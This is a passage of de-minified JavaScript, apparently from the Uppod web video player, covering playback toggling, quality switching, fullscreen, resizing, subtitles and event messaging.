        e < -plheight + playlist.offsetHeight - 10 && (e = -plheight + playlist.offsetHeight - 10),
        plaim = e,
        plInterval = setInterval(SlidePLProcess, 20)))
    }
    function SlidePLProcess() {
        var t = plaim;
        "inside" != vars.plplace && "bottom" != vars.plplace || (Math.abs((pl_mc.offsetLeft - t) / 10) <= 1 ? clearInterval(plInterval) : CSS(pl_mc, {
            position: "absolute",
            top: "bottom" == vars.plplace ? 0 : 10,
            left: pl_mc.offsetLeft - (pl_mc.offsetLeft - t) / 10
        })),
        "bottomrow" == vars.plplace && (Math.abs((pl_mc.offsetTop - t) / 10) <= 1 ? clearInterval(plInterval) : CSS(pl_mc, {
            position: "absolute",
            top: pl_mc.offsetTop - (pl_mc.offsetTop - t) / 10,
            left: 0
        }))
    }
    function ClearOldVars() {
        sub && (KillSub(),
        sub = null),
        vars.ors = 0
    }
    function NewFile(t, e) {
        Uppod.trace("NewFile s=" + t + " autoplay=" + e),
        istartevnt = iplay = !1,
        vars.file = t,
        e && (vars.auto = "play"),
        Media(),
        Comment(),
        e && OnPlay()
    }
    function checkStart() {
        null != media && (0 != Uppod.browser.doSendCanPlay && vars.file && "" != vars.file && "play" == vars.auto || onReady(),
        0 <= media.networkState || vars.youtube ? (init = !0,
        CSS(media, {
            opacity: 1,
            filter: "alpha(opacity=100)"
        }),
        Opacity(media, 1),
        playInterval = setInterval(Playing, 100),
        media.addEventListener("pause", OnPause, !1),
        media.addEventListener("seeking", OnSeeking, !1),
        media.addEventListener("seeked", OnSeeked, !1),
        media.addEventListener("volumechange", OnVolume, !1),
        document.addEventListener("fullscreenchange", function() {
            isFullscreen() || !ifull || opera || FullOff()
        }, !1),
        document.addEventListener("mozfullscreenchange", function() {
            !isFullscreen() && ifull && FullOff()
        }, !1),
        document.addEventListener("webkitfullscreenchange", function(t) {
            !isFullscreen() && ifull && FullOff()
        }, !1),
        document.addEventListener("MSFullscreenChange", function() {
            !isFullscreen() && ifull && FullOff()
        }, !1),
        muted || 0 == v ? Volume(0) : 0 < v && Volume(-v),
        initevent || (Event("init"),
        initevent = !0)) : setTimeout(checkStart, 100))
    }
    function isFullscreen() {
        return document.webkitFullscreenElement || document.webkitIsFullScreen || document.mozFullScreen || document.msFullscreenElement || null != document.fullscreenElement
    }
    function Play() {
        iplay = !1,
        Toggle()
    }
    function Pause() {
        iplay = !0,
        Toggle()
    }
    function Toggle(t) {
        "" != vars.redirect && 1 == vars.redirect_play && (window.open(vars.redirect, vars.redirecttarget),
        vars.redirect_play = 0),
        Protection(),
        Uppod.trace("Toggle e=" + t),
        "none" != vars.auto || vars.youtube || (media.autoplay = !0,
        Source(),
        istart = !0),
        vars.auto = "play",
        vars.file && "" != vars.file || Event("player_error", "nofile"),
        istart = !0,
        iplay ? (isYoutube() ? media_yt.pauseVideo() : uppod.mediaW().pause(),
        OnPause()) : (isYoutube() ? media_yt.playVideo() : uppod.mediaW().play(),
        OnPlay())
    }
    function Mybut(m) {
        var act, js_vars;
        mybuts[m.substr(11)] && (act = mybuts[m.substr(11)].s.link,
        0 == act.indexOf("http") ? Link(act, mybuts[m.substr(11)].s.target ? mybuts[m.substr(11)].s.target : "_blank") : ("toggle" == act && Toggle(),
        "screenshot" == act && Toggle(),
        0 == act.indexOf("js:") && (js_vars = "",
        0 < act.indexOf(",") && (js_vars = act.substr(act.indexOf(",") + 1),
        act = act.substr(0, act.indexOf(","))),
        eval(act.substr(3) + '("' + js_vars + '")'))),
        Event("mybut", act))
    }
    function Link(l, t) {
        var myjsa;
        l && (l = l.replace("(referer)", encodeURIComponent(vars.referer)),
        l = l.replace("(link)", encodeURIComponent(vars.link)),
        l = l.replace("(file)", encodeURIComponent(vars.file)),
        l = l.replace("(redirect)", encodeURIComponent(vars.redirect)),
        l = l.replace("(comment)", encodeURIComponent(vars.title)),
        l = l.replace("(title)", encodeURIComponent(vars.title)),
        l = l.replace("(time)", CurrentTime()),
        "js:" == l.substr(0, 3) && (myjsa = l.substr(3).split(","),
        eval(myjsa[0] + "(" + (1 < myjsa.length ? myjsa[1] : "") + (2 < myjsa.length ? "," + myjsa[2] : "") + (3 < myjsa.length ? "," + myjsa[3] : "") + ");")),
        0 == l.indexOf("http") && window.open(l, t))
    }
    function Stop() {
        Uppod.trace("Stop"),
        iplay && (Toggle(),
        OnPause()),
        0 == vars.radio && Seek(0),
        time_play_b && (time_play_b.c.innerHTML = formatTime(0)),
        time_back_b && (time_back_b.c.innerHTML = formatTime(Duration())),
        vars.auto = "none",
        isYoutube() && media_yt.stopVideo(),
        Media(),
        Event("stop"),
        null != vars.ga && 1 == vars.gastop && (vars.gatracked.stoped || gaTracker("stoped")),
        poster_mc && "video" == vars.m && Show(poster_mc),
        line_b && run_b && RunPos(run_b, line_b, line_play_b, line_all_b, run_pos),
        sub && StopSub()
    }
    function Download() {
        iplay && Toggle();
        var t = 1 != vars.download && "" != vars.download ? vars.download : 0 < uppod.mediaW().length ? uppod.mediaW().sources[0] : 0 < vars.file.indexOf("|") ? vars.file.substr(0, vars.file.indexOf("|")) : vars.file;
        window.open(t, "_blank"),
        Event("download"),
        null != vars.ga && 1 == vars.gadownload && (vars.gatracked.downloaded || gaTracker("downloaded"))
    }
    function Protection() {
        vars.urlprotect_go && (1 == vars.urlprotect_stop && (media.src = ""),
        1 == vars.urlprotect_warning && Alert(("" != vars.redirect ? '<a href="' + vars.redirect + '" style="font-size:200%;color:#fff">' : "") + ("" != vars.urlprotect_msg ? vars.urlprotect_msg : vars.redirect) + ("" != vars.redirect ? "</a>" : ""), !1))
    }
    function Quality() {
        var t;
        hd_b && vars.filehd && (vars.start = media.currentTime,
        t = vars.file,
        NewFile(vars.filehd, !0),
        vars.filehd = t,
        "none" == hd1_b.c.style.display ? (Hide(hd_b.c),
        Show(hd1_b.c),
        Event("quality", "1")) : (Hide(hd1_b.c),
        Show(hd_b.c),
        Event("quality", "0")))
    }
    function QualityLinks() {
        var t;
        if (!vars.youtube && (vars.hd && vars.file))
            if (0 < vars.hd.indexOf("::") && (vars.filehd = vars.file.replace(vars.hd.split("::")[0], vars.hd.split("::")[1]),
            t = !1,
            hd1_b ? "block" == hd1_b.c.style.display && (t = !0) : 1 == vars.hd1 && (t = !0),
            t && (t = vars.file,
            vars.file = vars.filehd,
            vars.filehd = t)),
            -1 < vars.file.indexOf(",") && -1 == vars.file.indexOf("[") && (vars.file = "[" + vars.file + "]"),
            -1 < vars.file.indexOf("[") && -1 < vars.file.indexOf("]")) {
                var e = vars.file.substr(vars.file.indexOf("[") + 1, vars.file.indexOf("]") - vars.file.indexOf("[") - 1).split(vars.hdseparator)
                  , i = "";
                for (h = 0; h < e.length; h++)
                    i += "" != e[h] ? vars.file.substr(0, vars.file.indexOf("[")) + e[h] + vars.file.substr(vars.file.indexOf("]") + 1) : "",
                    h < e.length - 1 && (i += vars.hdseparator);
                if (vars.hdlinks = i.split(vars.hdseparator),
                HdSelect(),
                hdselect)
                    vars.file = hdselect.value;
                else
                    for (h = 0; h < vars.hdlinks.length; h++)
                        if ("" != vars.hdlinks[h]) {
                            vars.file = vars.hdlinks[h];
                            break
                        }
            } else {
                var o = vars.hd.split(vars.hdseparator);
                for (vars.hdlinks = [],
                h = 0; h < o.length; h++)
                    0 == h ? vars.hdlinks[h] = vars.file : vars.hdlinks[h] = "";
                HdSelect()
            }
    }
    function onHlsQuality() {
        var t = uppod.mediaW().hls.levels
          , e = []
          , i = [];
        if (e[0] = "hls0",
        i[0] = vars.lang2.auto,
        1 < t.length)
            for (var o = 0; o < t.length; o++)
                e[o + 1] = "hls" + o,
                i[o + 1] = t[o].height ? t[o].height + "p" : o;
        vars.hdlinks = e,
        vars.hda = i,
        HdSelect(),
        vars.hls_quality = !0
    }
    function HdSelect() {
        if (hd_b && hdselect && vars.hdlinks) {
            var t = 0
              , e = []
              , i = 0;
            for (hdselect.innerHTML = "",
            1 == vars.hd1 && "" == vars.quality && (vars.quality = vars.hda[vars.hda.length - 1]),
            h = 0; h < vars.hda.length; h++)
                vars.hdlinks[h] && "" != vars.hdlinks[h] && (e[h] = document.createElement("option"),
                e[h].value = vars.hdlinks[h],
                e[h].innerHTML = vars.hda[h],
                hdselect.appendChild(e[h]),
                CSS(e[h], {
                    "background-color": "#171717",
                    color: "#fff"
                }),
                vars.hda[h] != vars.quality && "," != vars.hdlinks || (t = i,
                e[h].setAttribute("selected", "true"),
                QualitySelect(!1)),
                i++);
            SelectRework(hdselect.options[t].text, hd_b)
        }
    }
    function QualitySelecter() {
        QualitySelect(!0)
    }
    function QualitySelect(t) {
        var e;
        hd_b && vars.hdlinks && (1 == vars.remquality && (uppod_storage_support ? localStorage.setItem("pljsquality", hdselect.options[hdselect.selectedIndex].text) : setCookie("pljsquality", hdselect.options[hdselect.selectedIndex].text, 365)),
        0 == (e = hdselect.value).indexOf("hls") ? (t && (vars.start = media.currentTime),
        uppod.mediaW().hls.nextLevel = "hlsauto" == e ? -1 : +e.substr(3)) : vars.youtube ? (t && (vars.start = media_yt.getCurrentTime()),
        isYoutube() && (e = CurrentTime(),
        media_yt.stopVideo(),
        media_yt.setPlaybackQuality(hdselect.value),
        media_yt.playVideo(),
        media_yt.seekTo(e))) : (t && (vars.start = media.currentTime),
        vars.file = hdselect.value,
        NewFile(hdselect.value, !mobile && t)),
        SelectRework(hdselect.options[hdselect.selectedIndex].text, hd_b),
        vars.quality = hdselect.options[hdselect.selectedIndex].text,
        Event("quality", vars.quality))
    }
    var fsdiv = 0, fsdivin, menu_big;
    function FullScroll(t) {
        t.preventDefault(),
        media && (browser.osWin && t.deltaY < 0 || !browser.osWin && 0 < t.deltaY ? media.volume + .1 < 1 ? media.volume += .1 : media.volume = 1 : 0 < media.volume - .1 ? media.volume -= .1 : media.volume = 0,
        0 == fsdiv && (fsdiv = createElement("div"),
        uppod.document.appendChild(fsdiv)),
        fsdiv.innerHTML = "<uppodspan style='position:absolute;top:10px;right:10px;font:20px sans-serif;color:#fff'>" + vars.lang2.volume + " " + parseInt(100 * media.volume) + "%</uppodspan>",
        clearInterval(fsdivin),
        fsdivin = setInterval(FullScrollHide, 1e3))
    }
    function FullScrollHide() {
        uppod.document.removeChild(fsdiv),
        fsdiv = 0,
        clearInterval(fsdivin)
    }
    function Full(t) {
        ifull && "re" != t ? FullOff() : (nativecontrols ? media.controls || (CSS(controls, {
            visibility: "hidden"
        }),
        media.controls = !0,
        Remove("layer"),
        media_mc.onclick = null,
        poster_mc && "video" == vars.m && (poster_mc.style.display = "none")) : (window.addEventListener("wheel", FullScroll, !0),
        1 == vars.realfullscreen && Uppod.Fullscreen.request(vars.stg) && (irealfull = !0),
        Uppod.Fullscreen.hack(vars.stg),
        "" == vars.iframe && !vars.iframeobject || irealfull || CSS(vars.iframeobject || window.parent.document.getElementById(vars.iframe), {
            width: window.parent.innerWidth,
            height: window.parent.innerHeight,
            position: "fixed",
            left: 0,
            top: 0
        }),
        "re" != t && (ifull = !0,
        vars.stagewidth = vars.sw,
        vars.stageheight = vars.sh,
        CSS(body.canvas, {
            visibility: "hidden",
            height: ("" != vars.iframe ? window.parent : window).innerHeight
        }),
        setTimeout(function() {
            CSS(body.canvas, {
                visibility: "hidden",
                height: ("" != vars.iframe ? window.parent : window).innerHeight
            })
        }, 500),
        setTimeout(function() {
            CSS(body.canvas, {
                visibility: "hidden",
                height: ("" != vars.iframe ? window.parent : window).innerHeight
            })
        }, 700),
        CSS(media_mc, {
            backgroundColor: "#000",
            position: "fixed",
            left: 0,
            top: 0
        })),
        full_b && (full_b.c.style.display = "none",
        full_back_b.c.style.display = "block"),
        vars.stageposition = getCss(vars.stg, "position") || "static",
        browser.isIE && (vars.stageposition = "static"),
        vars.stageleft = getCss(vars.stg, "left"),
        vars.stagetop = getCss(vars.stg, "top"),
        vars.stageMargins = getCss(vars.stg, "margin"),
        CSS(vars.stg, {
            width: "100%",
            height: "100%",
            margin: "0",
            position: "fixed",
            left: "0px",
            top: "0px",
            "z-index": "999999999",
            overflow: "hidden"
        }),
        null != layer && (layer.style.display = "none"),
        oo && (oo.style.display = "none"),
        clearInterval(hideInterval),
        hideInterval = setInterval(CntrlHide, 3e3),
        "re" != t && Event("fullscreen"),
        tip && tip.parentNode && tip.parentNode.removeChild(tip)),
        playlist && ("inside" != vars.plplace && CSS(playlist, {
            top: -1e3
        }),
        plnext_b && "inside" != vars.plplace && (Hide(plnext_b.c),
        Hide(plprev_b.c))),
        vars.controls_active = !1),
        setTimeout(MenuPosition, 100),
        logo && PositionLogo(),
        (sub || sub_menu) && setTimeout(PositionSub, 500)
    }
    function FullOff() {
        window.removeEventListener("wheel", FullScroll, !0),
        document.cancelFullScreen ? document.cancelFullScreen() : document.exitFullscreen ? document.exitFullscreen() : document.cancelFullscreen ? document.cancelFullscreen() : document.mozCancelFullScreen ? document.mozCancelFullScreen() : document.webkitCancelFullScreen ? document.webkitCancelFullScreen() : document.msExitFullscreen && document.msExitFullscreen(),
        ifull = !1,
        "" == vars.iframe && !vars.iframeobject || irealfull || CSS(vars.iframeobject || window.parent.document.getElementById(vars.iframe), {
            width: vars.stagewidth,
            height: vars.stageheight,
            margin: vars.stageMargins,
            position: "static",
            left: 0,
            top: 0
        }),
        CSS(media_mc, {
            backgroundColor: "transparent",
            position: "absolute",
            left: 0,
            top: 0
        }),
        CSS(vars.stg, {
            width: "" != vars.stagewidthproc ? vars.stagewidthproc : vars.stagewidth,
            height: vars.stageheight,
            margin: vars.stageMargins,
            position: vars.stageposition,
            left: vars.stageleft,
            top: vars.stagetop
        }),
        CSS(body.canvas, {
            visibility: "visible",
            height: vars.stageheight
        }),
        CSS(scrn, {
            visibility: "visible"
        }),
        isYoutube() || null == layer || (layer.style.display = "block"),
        oo && (oo.style.display = "block"),
        full_b && (full_b.c.style.display = "block",
        full_back_b.c.style.display = "none"),
        playlist && PlPlace(),
        logo && PositionLogo(),
        (sub || sub_menu) && setTimeout(PositionSub, 500),
        tip && tip.parentNode && tip.parentNode.removeChild(tip),
        Event("exitfullscreen")
    }
    function Menu() {
        var t, e, i;
        menu_big ? ShowHide(menu_big) : (menu_big = createElement("div"),
        t = vars.scrn_w < 320 ? vars.scrn_w - 30 : 350,
        i = ("" != vars.download && 0 != vars.download ? 45 : 0) + (1 == vars.menu_nocode ? 0 : 45) + ("" != vars.link ? 45 : 0) + 11,
        e = new Shaper2({
            w: vars.menu_w = t,
            h: vars.menu_h = i,
            o: 10,
            bgc: "000000|000000",
            bga1: .5,
            bga2: .5
        }),
        menu_big.appendChild(e.c),
        CSS(e.c, {
            position: "relative",
            top: "0",
            left: "0"
        }),
        "" != vars.download && 0 != vars.download && MenuBigItem("menu_download", 1 == vars.download ? vars.file : vars.download, t, i),
        "" != vars.link && MenuBigItem("menu_link", vars.link, t, i),
        CSS(menu_big, {
            color: "#ffffff",
            font: "10px Verdana"
        }),
        menu_big.style.zIndex = 100,
        MenuBigItem("menu_code", "" != vars.iframeurl ? '<iframe title="sample" width="' + vars.w + '" height="' + vars.h + '" src="' + vars.iframeurl + '" frameborder="0" allowfullscreen></iframe>' : "" != vars.embedcode ? vars.embedcode : "", t, i),
        (i = createElement("div")).innerHTML = "&nbsp; x &nbsp;",
        menu_big.appendChild(i),
        CSS(i, {
            position: "absolute",
            top: 3,
            left: t - 25,
            cursor: "pointer"
        }),
        i.onclick = MenuClose,
        body.c.appendChild(menu_big),
        MenuPosition())
    }
    var menuitems = 0;
    function MenuBigItem(t, e, i, o) {
        var s = createElement("div");
        s.innerHTML = vars.lang2[t],
        menu_big.appendChild(s),
        CSS(s, {
            position: "absolute",
            top: 5 + 45 * menuitems,
            left: 15
        });
        s = new Shaper2({
            w: i - 20,
            h: 23,
            o: 5,
            bgc: "ffffff"
        });
        CSS(s.c, {
            position: "absolute",
            top: 22 + 45 * menuitems,
            left: 10
        }),
        menu_big.appendChild(s.c);
        s = document.createElement("input");
        menu_big.appendChild(s),
        CSS(s, {
            position: "absolute",
            outline: "none",
            font: "10px Verdana",
            top: 25 + 45 * menuitems,
            left: 13,
            width: i - 28,
            height: 15,
            color: "#000000",
            border: 0,
            background: "none"
        }),
        s.value = e,
        s.onclick = function() {
            this.select()
        }
        ,
        menuitems++
    }
    function MenuClose() {
        menu_big && CSS(menu_big, {
            display: "none"
        })
    }
    function MenuPosition() {
        menu_big && CSS(menu_big, {
            position: "absolute",
            top: ((ifull ? vars.sh : vars.stageheight) - vars.menu_h) / 2,
            left: ((ifull ? vars.sw : vars.stagewidth) - vars.menu_w) / 2
        })
    }
    function CntrlHide() {
        var t, e, i = !1;
        uppod.ads() && uppod.ads().isActive() && (i = !0),
        (iplay && 0 < CurrentTime() || i) && (t = !iover && !vars.controls_active && 1 == vars.cntrlhide,
        e = ifull && !vars.controls_active && 1 == vars.fullcntrlhide,
        (t || e || i) && (clearInterval(hideInterval),
        CSS(controls, {
            visibility: "hidden"
        }),
        playlist && "inside" == vars.plplace && "none" != playlist.style.display && Pl(),
        CSS(uppod.iframe, {
            cursor: "none"
        }),
        isYoutube() && (mouseMoveCatcher.style.display = "block"),
        ihide = !0))
    }
    function CntrlShow() {
        clearInterval(hideInterval),
        mouseMoveCatcher.style.display = "none",
        nativecontrols || (CSS(controls, {
            visibility: "visible"
        }),
        CSS(uppod.iframe, {
            cursor: "auto"
        }),
        ihide = !1)
    }
    function ScreenSize() {
        vars.scrn_w = vars.sw - 2 * vars.padding,
        vars.scrn_h = vars.ph - 2 * vars.padding - (1 == vars.cntrlout ? vars.cntrloutheight : 0)
    }
    function Resize() {
        var t, e = vars.stg.offsetWidth, i = vars.stg.offsetHeight;
        document.msFullscreenElement && window.top !== window && (e = window.screen.width,
        i = window.screen.height),
        0 != vars.sw && 0 != vars.sh && 0 != i && 0 != e && (t = 0,
        vars.sw != e && vars.sh == i && 1 == vars.autoheight && (t = vars.sw / vars.sh),
        vars.ph != vars.sh ? vars.ph = i - (vars.sh - vars.ph) : vars.ph = i,
        vars.sw = e,
        vars.sh = i,
        ifull || (vars.stagewidth = vars.sw,
        vars.stageheight = vars.sh),
        ScreenSize(),
        i = (ifull ? vars.sh : vars.ph) - 2 * vars.padding - (1 == vars.cntrlout ? vars.cntrloutheight : 0),
        ifull || (CSS(body.canvas, {
            width: vars.sw,
            height: vars.sh
        }),
        CSS(scrn, {
            width: vars.sw - 2 * vars.padding,
            height: i
        }),
        CSS(layer, {
            height: i
        })),
        alrt && (CSS(alrt_bg.canvas, {
            width: "" + vars.sw - (ifull ? 0 : 2 * vars.padding) + "px"
        }),
        0 < vars.padding && CSS(alrt, {
            top: ifull ? 0 : vars.padding,
            left: ifull ? 0 : vars.padding
        })),
        poster_mc && CSS(poster_mc, {
            width: vars.sw,
            height: vars.ph - 2 * vars.padding - (1 == vars.cntrlout ? vars.cntrloutheight : 0)
        }),
        CSS(media_mc, {
            width: "" + vars.sw - (ifull ? 0 : 2 * vars.padding) + "px",
            height: i + "px"
        }),
        CSS(media, {
            width: "" + vars.sw - (ifull ? 0 : 2 * vars.padding) + "px",
            height: i + "px"
        }),
        isYoutube() && CSS(document.getElementById("yt_media_" + vars.uid), {
            width: "" + vars.sw - (ifull ? 0 : 2 * vars.padding) + "px",
            height: i + "px"
        }),
        0 < vars.o && oPos(),
        uppod.controls().ControlBar.resize(),
        uibg && (CSS(uibg.canvas, {
            width: vars.sw - (ifull ? 0 : 2 * vars.padding) - 2 * vars.cntrlbgmargin - vars.cntrlbgmarginleft - vars.cntrlbgmarginright + "px",
            height: vars.cntrloutheight + "px"
        }),
        uibg_gl && CSS(uibg_gl.canvas, {
            width: vars.sw - (ifull ? 0 : 2 * vars.padding) - 2 * vars.cntrlbgmargin + "px"
        })),
        start_b && CSS(start_b.c, {
            left: vars.sw / 2 - start_b.w / 2,
            top: (ifull ? vars.sh : vars.ph) / 2 - start_b.h / 2
        }),
        PlaceControls(),
        playlist && (PlPlace(),
        plnext_b && (("inside" != vars.plplace || "none" == playlist.style.display) && ifull || (Show(plnext_b.c),
        Show(plprev_b.c),
        PlArrows(),
        0 < plpage && (--plpage,
        PlArrowNext())))),
        sub && PositionSub(),
        0 < t && (vars.stg.style.height = e / t + "px"))
    }
    function Back() {
        Seek(0)
    }
    function Mute() {
        muted = isYoutube() ? media_yt.isMuted() ? (media_yt.unMute(),
        !1) : (media_yt.mute(),
        !0) : media.muted ? media.muted = !1 : media.muted = !0,
        MuteControl()
    }
    function MuteControl() {
        volume_b && (volume_b.c.style.display = muted ? "none" : "block"),
        volume_mute_b && (volume_mute_b.c.style.display = muted ? "block" : "none")
    }
    function OnPlay() {
        var t, e;
        FileTo("OnPlay"),
        Uppod.trace("OnPlay"),
        iplay || (nativecontrols && !media.controls && (CSS(controls, {
            visibility: "hidden"
        }),
        media.controls = !0,
        Remove("layer"),
        media_mc.onclick = null),
        poster_mc && "video" == vars.m && (poster_mc.style.display = "none"),
        null != play_b && (play_b.c.style.display = "none",
        pause_b.c.style.display = "block"),
        iplay = !0,
        t = 1 == vars.cntrlhide && !vars.controls_active && 0 == vars.cntrlout,
        e = ifull && !vars.controls_active && 1 == vars.fullcntrlhide,
        (t || e) && (clearInterval(hideInterval),
        hideInterval = setInterval(CntrlHide, 3e3)),
        null != vars.title && "" != vars.title && 1 == vars.showname && (1 == vars.shownameliketip ? 1 == vars.shownameonstop && Hide(nametip) : Hide(alrt)),
        "inside" == vars.plplace && playlist && (Hide(playlist),
        plnext_b && Hide(plnext_b.c),
        plprev_b && Hide(plprev_b.c)),
        start_b && (start_b.c.style.display = "none"),
        logo && (1 == vars.logoplay ? Show : Hide)(logo),
        Event("play"),
        null != vars.ga && 1 == vars.gaplay && (vars.gatracked.played || gaTracker("played")),
        document.removeEventListener("keydown", KeyHandler),
        uppod_active_player_uid = vars.uid,
        document.addEventListener("keydown", KeyHandler),
        1 == vars.autofull && Full(),
        istartevnt || (Event("start"),
        istartevnt = istart = !0,
        1 == vars.infoloader && null != vars.infoloaderurl && (getRadioInfo(),
        itervalRi = setInterval(getRadioInfo, 1e3 <= vars.infoloaderinterval ? vars.infoloaderinterval : 1e3 * vars.infoloaderinterval, !1))),
        vars.sub && (1 == vars.substart || mobile && nativecontrols) && CreateSubs())
    }
    function getRadioInfo() {
        var t = new ("onload"in new XMLHttpRequest ? XMLHttpRequest : XDomainRequest);
        t.open("GET", vars.infoloaderurl + (1 == vars.infoloaderaddurl || 1 == vars.radio ? "?url=" + vars.file : ""), !0),
        t.onload = function() {
            4 == this.readyState && 200 == this.status ? RadioInfo(this) : console.log("Ошибка загрузки тегов")
        }
        ,
        t.onerror = function(t) {
            console.log("Ошибка загрузки тегов")
        }
        ,
        t.send()
    }
    function RadioInfo(t) {
        t = t.responseText;
        if (-1 < t.indexOf("|uppod|")) {
            for (var e = t.split("|uppod|"), i = vars.infoloadermask, o = 0; o < e.length; o++)
                for (var s = new RegExp("\\{" + (+o + 1) + "\\}"), l = 0; l < i.split("{" + (+o + 1) + "}").length; l++)
                    i = i.replace(s, e[o]);
            i = (1 < vars.id3 ? vars.title + "<br>" : "") + i,
            1 == vars.shownameliketip ? NameTip((1 == vars.marquee ? "<marquee>" : "") + i + (1 == vars.marquee ? "</marquee>" : "")) : Alert((1 == vars.marquee ? "<marquee>" : "") + i + (1 == vars.marquee ? "</marquee>" : ""), !1)
        }
    }
    function OnSeeking() {
        Event("seeking")
    }
    function OnSeeked() {
        Event("seeked")
    }
    function OnPause() {
        Uppod.trace("OnPause"),
        iplay && (null != play_b && (play_b.c.style.display = "block",
        pause_b.c.style.display = "none"),
        iplay = !1,
        null != vars.title && "" != vars.title && 1 == vars.showname && (1 == vars.shownameliketip ? Show(nametip) : Show(alrt)),
        start_b && (start_b.c.style.display = "block"),
        logo && (1 == vars.logopause ? Show : Hide)(logo),
        Event("pause"))
    }
    function Event(t, e) {
        vars.events[t] = e;
        e = document.createEvent("Events");
        e.initEvent(t, !0, !0),
        vars.stg.dispatchEvent(e),
        1 == vars.postmessage && (t = {
            event: e = t,
            time: CurrentTime()
        },
        "duration" != e && "time" != e || (t.duration = Duration()),
        "volume" != e && "unmute" != e || (t.volume = (media || vars).volume),
        window.parent.postMessage(t, "*"),
        e = "vast_Impression" == e ? "adShown" : "seek" == e ? "rewound" : "pause" == e ? "paused" : "play" == e ? "resumed" : "init" != e && "start" != e && "end" != e ? "" : e + "ed",
        "" != (t.event = e) && window.parent.postMessage(t, "*"))
    }
    function onCanPlay() {
        Uppod.trace("onCanPlay"),
        0 < vars.start && (Uppod.trace("onCanPlay set currentTime to " + vars.start),
        media.currentTime = vars.start,
        vars.start = 0),
        onReady()
    }
    function OnVolume() {
        volbarline_all_b && (vars.ivolbar_v ? VolumeDraw(media.volume * volbarline_s.h) : VolumeDraw(media.volume * volbarline_s.w)),
        volbar_b && VolumeDraw(media.volume * vars.cntrlvolbar.w)
    }
    function OnEnded() {
        Uppod.trace("OnEnded"),
        (media.ended || isYoutube()) && (Event("end"),
        null != vars.ga && 1 == vars.gaend && (vars.gatracked.ended || gaTracker("ended")),
        1 == vars.radio ? Reload() : 1 == vars.repeat ? Play() : (isYoutube() || Back(),
        (1 == vars.plplay && pl ? PlNext : TheEnd)()))
    }
    function Reload() {
        Uppod.trace("Reload"),
        Stop(),
        Toggle()
    }
    function Sizing() {
        var t = vars.stg.offsetWidth
          , e = vars.stg.offsetHeight;
        document.msFullscreenElement && window.top !== window && (t = window.screen.width,
        e = window.screen.height),
        (t != vars.sw || e < vars.sh - 5 || e > vars.sh + 5) && Resize()
    }
    function Playing() {
        if (null != media) {
            if (updateTimeDisplay(),
            iline) {
                var t = CurrentTime()
                  , e = Duration()
                  , i = 0;
                if (isYoutube())
                    i = media_yt.getVideoLoadedFraction();
                else if (media.buffered && 0 < media.buffered.length) {
                    for (var o = 0; o < media.buffered.length; o++)
                        (t >= media.buffered.start(o) || t >= media.buffered.start(o) - 100) && t <= media.buffered.end(o) && (i = media.buffered.end(o) / media.duration);
                    0 == i && (i = media.buffered.end(media.buffered.length - 1) / media.duration)
                }
                0 < i && (CSS(line_load_b, {
                    width: i * line_all_b.w + "px"
                }),
                1 == i ? iloaded || (iloaded = !0,
                Event("loaded")) : iloaded = !1),
                CSS(line_play_b, {
                    width: t / e * line_all_b.w + "px"
                }),
                ibuff && !igo && 0 < t && (HideBuffer(),
                igo = !0),
                iplay && t == lastTime ? 5 < ltc ? (ibuff || ShowBuffer(),
                ibuff = !0) : ltc++ : (ibuff && (ibuff = !1,
                HideBuffer()),
                ltc = 0),
                lastTime = t
            }
            if (iplay && 1 == vars.reloader && (CurrentTime() == vars.reloadertime ? (vars.reloadercounter++,
            200 < vars.reloadercounter && null != media.currentTime && (vars.reloadercounter = 0,
            Reload())) : vars.reloadercounter = 0,
            vars.reloadertime = CurrentTime()),
            0 != vars.eventtime && iplay)
                if (is_array(vars.eventtime))
                    for (o = 0; o < vars.eventtime.length; o++)
                        vars.events["time" + vars.eventtime[o]] || CurrentTime() > vars.eventtime[o] && Event("time" + vars.eventtime[o], CurrentTime());
                else
                    vars.events.time || CurrentTime() > vars.eventtime && Event("time", CurrentTime());
            if (0 != vars.eventplayed && iplay)
                if (is_array(vars.eventplayed))
                    for (o = 0; o < vars.eventplayed.length; o++)
                        vars.events["played" + vars.eventplayed[o]] || CurrentTime() / Duration() * 100 > vars.eventplayed[o] && Event("played" + vars.eventplayed[o], CurrentTime() / Duration() * 100);
                else
                    vars.events.played || CurrentTime() / Duration() * 100 > vars.eventplayed && Event("played", CurrentTime() / Duration() * 100);
            if (line_b && run_b && RunPos(run_b, line_b, line_play_b, line_all_b, run_pos),
            null != sub && 1 == vars.substart && sub[sub_lang] && sub[sub_lang][1]) {
                var s = parseInt(10 * CurrentTime());
                if (null != sub[sub_lang][1][s]) {
                    var l = "";
                    if (1 == vars.sublangsall && sub_lang_all)
                        for (o = 0; o < sub.length; o++)
                            l += sub[o][0][sub[o][1][s]] ? sub[o][0][sub[o][1][s]] + (o < sub.length - 1 ? "<br>" : "") : "";
                    else
                        l = sub[sub_lang][0][sub[sub_lang][1][s]];
                    sub && (sub_showed && sub_last && sub_last == l || ShowSub(l))
                }
                null == sub[sub_lang][1][s] && sub_showed && StopSub()
            }
            iplay && ("hidden" == body.c.style.visibility && (body.c.style.visibility = "visible"),
            "hidden" == media.style.visibility && (media.style.visibility = "visible"))
        }
        ifull && !irealfull && ("" != vars.iframe ? window.parent.innerWidth == vars.stg.offsetWidth && window.parent.innerHeight == vars.stg.offsetHeight || Full("re") : window.innerWidth == vars.stg.offsetWidth && window.innerHeight == vars.stg.offsetHeight || Full("re"))
    }
    function CurrentTime() {
        return t = 0,
        isYoutube() ? t = media_yt.getCurrentTime() : media && (t = media.currentTime),
        t
    }
    function Duration() {
        return t = 0,
        isYoutube() ? t = media_yt.getDuration() : media && media.duration && "Infinity" != media.duration && (t = media.duration),
        t
    }
    function NotFound() {
        var t = !0;
        0 < vars.or.length && (vars.ori++,
        (t = vars.ori > vars.or.length - 1) || NewFile(vars.or[vars.ori], !("play" != vars.auto || !mobile && 0 != vars.volume))),
        t && (Pause(),
        1 == vars.alerts && Alert(vars.lang2.file + " " + vars.lang2.notfound),
        Event("player_error", "file not found"),
        vars.ori = 0,
        uppod_storage_support ? null != localStorage.getItem("pljcuidx") && (vars.ori = parseInt(localStorage.getItem("pljcuidx"))) : "" != getCookie("pljcuidx") && (vars.ori = 0 < parseInt(getCookie("pljcuidx")) ? parseInt(getCookie("pljcuidx")) : 0))
    }
    function TheEnd() {
        nativecontrols || CntrlShow(),
        "" != vars.redirect && 1 == vars.redirect_end && (window.open(vars.redirect, vars.redirecttarget),
        vars.redirect_end = 0),
        media && (isYoutube() ? media_yt.pauseVideo() : (media.currentTime = 0,
        media.pause())),
